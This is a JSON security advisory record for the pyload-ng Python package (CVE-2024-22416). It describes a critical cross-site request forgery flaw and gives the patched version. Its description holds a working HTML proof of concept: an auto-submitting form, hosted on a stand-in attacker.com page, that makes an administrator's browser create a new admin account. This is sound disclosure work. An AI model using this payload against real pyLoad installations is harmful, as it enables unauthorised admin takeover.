{
  "Severity": "CRITICAL",
  "UpdatedAt": "2024-01-19T15:27:13Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "pyload-ng"
  },
  "Advisory": {
    "DatabaseId": 231700,
    "Id": "GSA_kwCzR0hTQS1wZ3BqLXY4NXEtaDVmbc4AA4kU",
    "GhsaId": "GHSA-pgpj-v85q-h5fm",
    "References": [
      {
        "Url": "https://github.com/pyload/pyload/security/advisories/GHSA-pgpj-v85q-h5fm"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-22416"
      },
      {
        "Url": "https://github.com/pyload/pyload/commit/1374c824271cb7e927740664d06d2e577624ca3e"
      },
      {
        "Url": "https://github.com/pyload/pyload/commit/c7cdc18ad9134a75222974b39e8b427c4af845fc"
      },
      {
        "Url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2024-17.yaml"
      },
      {
        "Url": "https://github.com/advisories/GHSA-pgpj-v85q-h5fm"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-pgpj-v85q-h5fm"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-22416"
      }
    ],
    "Description": "### Summary\nThe `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. This proof of concept shows how an unauthenticated user could trick the administrator's browser into creating a new admin user.\n\n### PoC\nWe host the following HTML file on an attacker-controlled server.\n```html\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n    \u003cform action=\"http://localhost:8000/api/add_user/%22hacker%22,%22hacker%22\"\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIf we now trick an administrator into visiting our malicious page at `https://attacker.com/CSRF.html`, we see that their browser will make a request to `/api/add_user/%22hacker%22,%22hacker%22`, adding a new administrator to the `pyload` application.\n![image](https://user-images.githubusercontent.com/44903767/294942232-d874e838-f8eb-492f-98df-2d16ba74ff25.png)\n\nThe attacker can now authenticate as this newly created administrator user with the username `hacker` and password `hacker`.\n![image](https://user-images.githubusercontent.com/44903767/294942635-c6d9adca-0f3a-4d99-92ac-6d3bf8e9ee01.png)\n\n### Impact\nAny API call can be made via a CSRF attack by an unauthenticated user.\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-01-19T15:27:12Z",
    "Severity": "CRITICAL",
    "Summary": "Cross-Site Request Forgery on any API call in pyLoad may lead to admin privilege escalation",
    "UpdatedAt": "2024-01-29T21:54:41Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 9.6,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.5.0b3.dev78"
      },
      "VulnerableVersionRange": "\u003c 0.5.0b3.dev78"
    }
  ]
}